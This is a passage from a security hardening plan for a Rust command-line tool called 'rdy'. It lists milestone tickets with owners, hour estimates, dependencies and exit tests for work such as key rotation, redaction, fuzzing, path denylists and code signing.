| rdy spec keygen and rdy spec sign | Encrypted by default, 0600 `create_new`, readable key refused | 1 |
| Command runner: fixed argv, scrubbed env, timeout kill, output caps, recorded-output replay | INV-08, process-group kill, Windows absolute paths | 1 |
| Read-only guard test for rdy-checks-k8s | Becomes a runtime tower layer plus test, INV-14 (3h instead of 1h) | 2 |
| Embed result JSON in the HTML report safely | INV-16 escapes and exact CSP | 0.5 |
| Check trait, Need and Context in rdy-engine | INV-10 privilege-carrying binary refusal | 0.5 |
| Error types with fix hints and exit code mapping at the CLI edge | INV-17 control-character escaping | 0.5 |

Covered by others without extra hours: 06 tickets (deny, audit, zizmor, rulesets, SHA pins, signing,
SBOM, install.sh, reserve names), ADR 0001 "Wire serde-saphyr" (INV-06 parser limits), and the
workspace skeleton (INV-18).

- [M2] SEC-40 `rdy run --plan` preview | owner: rust-engineer | est: 6h | depends on: SEC-17 Mediated Context handles with action log and read denylist | exit test: plan output matches the action log of a real run on the same fixtures.
- [M2] SEC-41 Upload client with consent, receipt and exact bytes | owner: rust-engineer | est: 12h | depends on: SEC-42 Share-link token format and scope | exit test: fake-server tests prove the Surface 4 requirements 1 to 3, 5 and 6.
- [M2] SEC-42 Share-link token format and scope | owner: security-reviewer | est: 6h | depends on: none | exit test: token spec agreed with rdy-cloud and the `rdy_st_` prefix covered by the corpus.
- [M2] SEC-43 Bundle collector path policy | owner: security-reviewer | est: 6h | depends on: SEC-17 Mediated Context handles with action log and read denylist | exit test: denylisted paths and symlink escapes are refused and the resolved file list is shown before collection.
- [M2] SEC-44 Full redaction corpus with chunk-boundary cases | owner: qa-engineer | est: 10h | depends on: SEC-26 M1 redaction corpus | exit test: 300 cases, including every chunk offset, with zero misses.
- [M2] SEC-45 Fuzz targets for spec parser and redactor | owner: qa-engineer | est: 6h | depends on: SEC-25 Minimal redactor for evidence, errors and logs | exit test: a weekly 30-minute fuzz run per target with no crashes.
- [M2] SEC-46 Vendor key rotation and rollback warnings | owner: rust-engineer | est: 8h | depends on: Trust store load and save in user and system locations | exit test: a rotated key passes, a removed key fails, an older `signed_at` than the last run warns.
- [M2] SEC-47 Portal-delivered spec and key trust | owner: security-reviewer | est: 4h | depends on: SEC-46 Vendor key rotation and rollback warnings | exit test: written decision; a key change for a pinned product fails in a fixture.
- [M2] SEC-56 `--allow-unsigned` TTY confirmation | owner: cli-ux | est: 1h | depends on: rdy verify command and refuse-unsigned behaviour with --allow-unsigned banner | exit test: a TTY run asks with default no; a non-TTY run does not prompt.
- [M2] SEC-57 Contact-set tests on macOS and Windows | owner: qa-engineer | est: 4h | depends on: SEC-22 No-phone-home strace test on Linux CI | exit test: equivalent destination checks pass on both CI legs.
- [M2] SEC-58 Windows output dir ACL hardening | owner: rust-engineer | est: 3h | depends on: SEC-19 Confine writes to a new output dir with safe names | exit test: report files carry an owner-only ACL on Windows CI.
- [M3] SEC-48 Read-only cloud API allowlist | owner: check-author | est: 6h | depends on: SEC-17 Mediated Context handles with action log and read denylist | exit test: every AWS operation the checks can call is read-only or simulate (cloud-iam-expert reviews).
- [M3] SEC-50 Windows and macOS code signing | owner: release-engineer | est: 8h | depends on: none | exit test: Authenticode and notarization verify on clean VMs.
- [M3] SEC-52 cargo-vet for direct dependencies | owner: security-reviewer | est: 6h | depends on: none | exit test: `cargo vet` passes in CI.
- [M3] SEC-53 Threat model for custom.exec | owner: security-reviewer | est: 4h | depends on: SEC-17 Mediated Context handles with action log and read denylist | exit test: a section is added here and reviewed by rust-architect before ADR 0005's build ticket starts.
- [M4] SEC-49 Review of verified self-update | owner: security-reviewer | est: 4h | depends on: none | exit test: 06's self-update build refuses tampered or wrong-identity assets and never runs unprompted.
- [M5] SEC-54 Independent security audit | owner: security-reviewer | est: 8h | depends on: none | exit test: report received and every high finding has a fix ticket.
